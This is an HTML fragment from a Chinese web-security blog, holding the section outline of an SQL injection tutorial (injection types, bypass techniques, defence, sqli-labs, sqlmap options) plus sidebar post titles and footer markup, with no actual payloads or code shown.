href="#12-%E6%9F%A5%E7%9C%8B%E4%B8%BB%E6%9C%BA%E5%90%8D%E7%A7%B0%EF%BC%9A"><span class="toc-text">12) 查看主机名称：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#13-%E6%9F%A5%E7%9C%8B%E6%97%B6%E9%97%B4"><span class="toc-text">13) 查看时间</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#14-%E5%88%9B%E5%BB%BA%E5%BA%93%EF%BC%9A"><span class="toc-text">14) 创建库：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#15-%E5%88%9B%E5%BB%BA%E8%A1%A8%EF%BC%9A"><span class="toc-text">15) 创建表：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#16-%E5%88%A0%E9%99%A4%E8%A1%A8%EF%BC%9A"><span class="toc-text">16) 删除表：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#17-%E4%BF%AE%E6%94%B9%E8%A1%A8%EF%BC%9A"><span class="toc-text">17) 修改表：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#18-%E6%9F%A5%E7%9C%8B%E8%A1%A8%E7%BB%93%E6%9E%84%EF%BC%9A"><span class="toc-text">18) 查看表结构：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#19-%E6%8F%92%E5%85%A5%E6%95%B0%E6%8D%AE%E5%88%B0%E8%A1%A8%E4%B8%AD%EF%BC%9A"><span class="toc-text">19) 插入数据到表中：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-MSSQL"><span class="toc-text">1.2 MSSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-1-%E7%AE%80%E4%BB%8B"><span class="toc-text">1.2.1 简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-2-%E5%BA%93%E7%BB%93%E6%9E%84"><span class="toc-text">1.2.2 库结构</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-3-Oracle"><span class="toc-text">1.3 Oracle</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-1-%E7%AE%80%E4%BB%8B"><span class="toc-text">1.3.1 简介</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-web%E5%8D%81%E5%A4%A7%E6%BC%8F%E6%B4%9E"><span class="toc-text">2 web十大漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-SQL%E6%B3%A8%E5%85%A5"><span class="toc-text">3 SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-text">3.1 SQL注入原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-%E6%9F%A5%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9%E4%BD%8D%E7%BD%AE"><span class="toc-text">3.2 查找注入点位置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-3-SQL%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB"><span class="toc-text">3.3 SQL注入分类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-1-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%88%86%E7%B1%BB"><span class="toc-text">3.3.1 数据类型分类</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%95%B0%E5%AD%97%E5%9E%8B"><span class="toc-text">1) 数字型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%AD%97%E7%AC%A6%E5%9E%8B"><span class="toc-text">2) 字符型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%90%9C%E7%B4%A2%E5%9E%8B"><span class="toc-text">3) 搜索型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-xx%E5%9E%8B"><span class="toc-text">4) xx型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-Json%E7%B1%BB%E5%9E%8B%EF%BC%88%E9%A2%9D%E5%A4%96%E5%8A%A0%E7%9A%84%EF%BC%89"><span class="toc-text">5) Json类型（额外加的）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-2-%E6%8F%90%E4%BA%A4%E6%96%B9%E5%BC%8F%E5%88%86%E7%B1%BB"><span class="toc-text">3.3.2 提交方式分类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-3-%E8%AF%B7%E6%B1%82%E6%95%B0%E6%8D%AE%E4%BD%8D%E7%BD%AE%E5%88%86%E7%B1%BB"><span class="toc-text">3.3.3 请求数据位置分类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-4-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">3.3.4 报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-5-%E5%B8%83%E5%B0%94%E5%9E%8B%E7%9B%B2%E6%B3%A8"><span class="toc-text">3.3.5 布尔型盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%88%A4%E6%96%AD%E9%97%AD%E5%90%88%E7%AC%A6%E7%B1%BB%E5%9E%8B"><span class="toc-text">1) 判断闭合符类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93%E9%95%BF%E5%BA%A6"><span class="toc-text">2) 爆数据库长度</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%9F%A5%E8%AF%A2%E5%BA%93%E5%90%8D"><span class="toc-text">3) 查询库名</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#3-1-%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5"><span class="toc-text">3.1) 手动注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-2-burpsuite%E7%88%86%E7%A0%B4"><span class="toc-text">3.2) burpsuite爆破</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E7%88%86%E7%A0%B4%E8%A1%A8%E5%90%8D"><span class="toc-text">4) 爆破表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E7%88%86%E7%A0%B4%E5%88%97%E5%90%8D"><span class="toc-text">5) 爆破列名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E7%88%86%E7%A0%B4%E5%85%B7%E4%BD%93%E5%80%BC"><span class="toc-text">6) 爆破具体值</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-6-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-text">3.3.6 时间盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-4-%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="toc-text">3.4 绕过方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-1-%E6%B3%A8%E9%87%8A%E7%AC%A6%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-text">3.4.1 注释符号绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-2-%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-text">3.4.2 大小写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-3-%E5%86%85%E8%81%94%E6%B3%A8%E9%87%8A%E7%BB%95%E8%BF%87"><span class="toc-text">3.4.3 内联注释绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-4-%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-text">3.4.4 双写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-5-%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-text">3.4.5 编码绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-URL%E7%BC%96%E7%A0%81"><span class="toc-text">1) URL编码</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-1-%E7%AE%80%E4%BB%8B"><span class="toc-text">1.1) 简介</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#1-2-%E7%BC%96%E7%A0%81%E8%A7%84%E5%88%99"><span class="toc-text">1.2) 编码规则</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1-2-1-%E5%AF%B9%E4%BF%9D%E7%95%99%E5%AD%97%E7%AC%A6%E7%9A%84%E7%99%BE%E5%88%86%E5%8F%B7%E7%BC%96%E7%A0%81"><span class="toc-text">1.2.1) 对保留字符的百分号编码</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#1-2-2-%E5%AF%B9%E7%99%BE%E5%88%86%E5%8F%B7%E5%AD%97%E7%AC%A6%E7%9A%84%E7%99%BE%E5%88%86%E5%8F%B7%E7%BC%96%E7%A0%81"><span class="toc-text">1.2.2) 对百分号字符的百分号编码</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#1-2-3-%E5%AF%B9%E9%9D%9EASCII%E5%AD%97%E7%AC%A6%E7%9A%84%E7%99%BE%E5%88%86%E5%8F%B7%E7%BC%96%E7%A0%81"><span class="toc-text">1.2.3) 对非ASCII字符的百分号编码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-ASCII%E7%BC%96%E7%A0%81"><span class="toc-text">2) ASCII编码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-16%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-text">4) 16进制绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-Unicode%E7%BC%96%E7%A0%81"><span class="toc-text">5) Unicode编码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-6-%E5%A4%A7%E4%BA%8E%E5%B0%8F%E4%BA%8E%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-text">3.4.6 大于小于号绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-7-%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="toc-text">3.4.7 空格绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-8-or-and-xor-not-%E7%BB%95%E8%BF%87"><span class="toc-text">3.4.8 or and xor not 绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-9-%E7%AD%89%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-text">3.4.9 等号绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8D%E5%8A%A0%E9%80%9A%E9%85%8D%E7%AC%A6%E7%9A%84like"><span class="toc-text">不加通配符的like</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#regexp"><span class="toc-text">regexp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%A4%A7%E5%B0%8F%E4%BA%8E%E5%8F%B7%E6%9D%A5%E7%BB%95%E8%BF%87"><span class="toc-text">使用大小于号来绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E7%BB%95%E8%BF%87"><span class="toc-text">使用&lt;&gt;绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-10-%E5%8D%95%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-text">3.4.10 单引号绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6"><span class="toc-text">十六进制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82"><span class="toc-text">宽字节</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-11-%E9%80%97%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-text">3.4.11 逗号绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#from-pos-for-len"><span class="toc-text">from pos for len</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#join%E5%85%B3%E9%94%AE%E5%AD%97%E7%BB%95%E8%BF%87"><span class="toc-text">join关键字绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#like%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-text">like关键字</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#offset%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-text">offset关键字</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-12-%E8%BF%87%E6%BB%A4%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="toc-text">3.4.12 过滤函数绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-13-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E6%97%B6%E5%88%A9%E7%94%A8-MySql-%E9%A2%84%E5%A4%84%E7%90%86"><span class="toc-text">3.4.13 堆叠注入时利用 MySql 预处理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-14-%E2%80%98%E2%80%9C-md5-pass-true-%E2%80%9D%E2%80%98-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87"><span class="toc-text">3.4.14 ‘“.md5($pass,true).”‘ 登录绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%99%84%E5%BD%95-PHP%E4%B8%AD%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81%E7%9A%84%E8%BF%87%E6%BB%A4%E6%96%B9%E6%B3%95%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="toc-text">附录 PHP中一些常见的过滤方法及绕过方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text"></span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E9%98%B2%E6%8A%A4"><span class="toc-text">注入防护</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs"><span class="toc-text">sqli-labs</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-1-20"><span class="toc-text">Less - 1~20</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-21-37"><span class="toc-text">Less - 21~37</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-38-53"><span class="toc-text">Less - 38~53</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-54-75"><span class="toc-text">Less - 54~75</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-sqlmap"><span class="toc-text">4 sqlmap</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-Github-README"><span class="toc-text">4.1 Github README</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-1-%E6%BC%94%E7%A4%BA%E6%88%AA%E5%9B%BE"><span class="toc-text">4.1.1 演示截图</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-2-%E5%AE%89%E8%A3%85%E6%96%B9%E6%B3%95"><span class="toc-text">4.1.2 安装方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-3-%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-text">4.1.3 使用方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-4-%E9%93%BE%E6%8E%A5"><span class="toc-text">4.1.4 链接</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-2-%E5%8F%82%E6%95%B0%E7%94%A8%E6%B3%95"><span class="toc-text">4.2 参数用法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-1-%E5%B8%B8%E8%A7%84%E6%AD%A5%E9%AA%A4"><span class="toc-text">4.2.1 常规步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-2-%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0"><span class="toc-text">4.2.2 常用参数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#u-%E6%8C%87%E5%AE%9AURL"><span class="toc-text">-u 指定URL</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#m-%E6%8C%87%E5%AE%9A%E6%96%87%E4%BB%B6"><span class="toc-text">-m 指定文件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#r-POST%E8%AF%B7%E6%B1%82"><span class="toc-text">-r POST请求</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#p"><span class="toc-text">-p</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93batch"><span class="toc-text">–batch</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93flush-session"><span class="toc-text">–flush-session</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93dbms"><span class="toc-text">–dbms</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93level"><span class="toc-text">–level</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93risk"><span class="toc-text">–risk</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93method"><span class="toc-text">–method</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93random-agent"><span class="toc-text">–random-agent</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93user-agent"><span class="toc-text">–user-agent</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93proxy"><span class="toc-text">–proxy</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93tamper"><span class="toc-text">–tamper</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93technique"><span class="toc-text">–technique</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%B6%E5%AE%83"><span class="toc-text">其它</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/01/14/Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Vulhub/" title="Log4j2漏洞复现-Vulhub"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img.shalom86012.eu.org/imgs/img-00000k.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Log4j2漏洞复现-Vulhub"/></a><div class="content"><a class="title" href="/2025/01/14/Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Vulhub/" title="Log4j2漏洞复现-Vulhub">Log4j2漏洞复现-Vulhub</a><time datetime="2025-01-14T09:26:47.000Z" title="发表于 2025-01-14 17:26:47">2025-01-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/07/SQL%E6%B3%A8%E5%85%A5/" title="SQL注入"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img.shalom86012.eu.org/imgs/wallhaven-9mdjx1.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SQL注入"/></a><div class="content"><a class="title" href="/2024/11/07/SQL%E6%B3%A8%E5%85%A5/" title="SQL注入">SQL注入</a><time datetime="2024-11-07T14:12:25.000Z" title="发表于 2024-11-07 22:12:25">2024-11-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/01/IDM%E7%A0%B4%E8%A7%A3%E6%95%99%E7%A8%8B/" title="IDM破解教程"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img.shalom86012.eu.org/imgs/wallhaven-7p3vy9.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="IDM破解教程"/></a><div class="content"><a class="title" href="/2024/11/01/IDM%E7%A0%B4%E8%A7%A3%E6%95%99%E7%A8%8B/" title="IDM破解教程">IDM破解教程</a><time datetime="2024-11-01T12:43:03.000Z" title="发表于 2024-11-01 20:43:03">2024-11-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/10/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" title="文件上传漏洞"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img.shalom86012.eu.org/imgs/wallhaven-5dg579.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="文件上传漏洞"/></a><div class="content"><a class="title" href="/2024/10/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" title="文件上传漏洞">文件上传漏洞</a><time datetime="2024-10-28T03:32:06.000Z" title="发表于 2024-10-28 11:32:06">2024-10-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/10/21/%E5%A6%82%E4%BD%95%E5%86%99%E4%B8%80%E7%AF%87%E5%90%88%E6%A0%BC%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A/" title="如何写一篇合格的漏洞报告"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img.shalom86012.eu.org/imgs/wallhaven-5wr788.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="如何写一篇合格的漏洞报告"/></a><div class="content"><a class="title" href="/2024/10/21/%E5%A6%82%E4%BD%95%E5%86%99%E4%B8%80%E7%AF%87%E5%90%88%E6%A0%BC%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A/" title="如何写一篇合格的漏洞报告">如何写一篇合格的漏洞报告</a><time datetime="2024-10-21T07:01:28.000Z" title="发表于 2024-10-21 15:01:28">2024-10-21</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div id="footer_deal"><a class="deal_link" href="mailto:shalom86012@gmail.com" title="email"><i class="anzhiyufont anzhiyu-icon-envelope"></i></a><img class="footer_mini_logo" title="返回顶部" alt="返回顶部" onclick="anzhiyu.scrollToDest(0, 500)" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img.shalom86012.eu.org/imgs/Shalom.webp" size="50px"/><a class="deal_link" target="_blank" rel="noopener" href="https://github.com/pluviophile8" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a></div><div id="workboard"><div id="runtimeTextTip"></div></div><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" data-title="博客框架为Hexo" title="博客框架为Hexo"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@2.1.5/img/badge/Frame-Hexo.svg" alt="博客框架为Hexo"/></a><a class="github-badge" target="_blank" href="https://blog.anheyu.com/" style="margin-inline:5px" data-title="本站使用AnZhiYu主题" title="本站使用AnZhiYu主题"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.9/img/Theme-AnZhiYu-2E67D3.svg" alt="本站使用AnZhiYu主题"/></a><a class="github-badge" target="_blank" href="https://github.com/" style="margin-inline:5px" data-title="本站项目由Github托管" title="本站项目由Github托管"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@2.1.5/img/badge/Source-Github.svg" alt="本站项目由Github托管"/></a><a class="github-badge" target="_blank" href="https://www.cloudflare.com/" style="margin-inline:5px" data-title="本站使用Cloudflare为静态资源提供CDN加速" title="本站使用Cloudflare为静态资源提供CDN加速"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img.shields.io/badge/%E2%98%81%EF%B8%8FCDN-Cloudflare-f4822f" alt="本站使用Cloudflare为静态资源提供CDN加速"/></a><a class="github-badge" target="_blank" href="https://vercel.com/" style="margin-inline:5px" data-title="本站使用Vercel托管评论系统" title="本站使用Vercel托管评论系统"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img.shields.io/badge/%E2%98%81%EF%B8%8FCDN-Vercel-ffffff" alt="本站使用Vercel托管评论系统"/></a></p></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2024 - 2025 By <a class="footer-bar-link" href="/" title="Shalom" target="_blank">Shalom</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a><a class="footer-bar-link" target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%BC%80%E7%8E%A9%E7%AC%91/3376588" title="ⓈICP备-20241016号">ⓈICP备-20241016号</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">9</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">4</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 总览</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/IDM/" style="font-size: 0.88rem;">IDM<sup>1</sup></a><a href="/tags/Log4j2/" style="font-size: 0.88rem;">Log4j2<sup>1</sup></a><a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 0.88rem;">SQL注入<sup>1</sup></a><a href="/tags/Vulhub/" style="font-size: 0.88rem;">Vulhub<sup>1</sup></a><a href="/tags/XSS/" style="font-size: 0.88rem;">XSS<sup>1</sup></a><a href="/tags/web%E5%AE%89%E5%85%A8/" style="font-size: 0.88rem;">web安全<sup>4</sup></a><a href="/tags/%E5%8D%9A%E5%AE%A2%E6%95%99%E7%A8%8B/" style="font-size: 0.88rem;">博客教程<sup>1</sup></a><a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 0.88rem;">文件上传<sup>1</sup></a><a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A/" style="font-size: 0.88rem;">漏洞报告<sup>1</sup></a><a href="/tags/%E7%A0%B4%E8%A7%A3/" style="font-size: 0.88rem;">破解<sup>1</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="font-size: 0.88rem;">网络安全<sup>5</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont 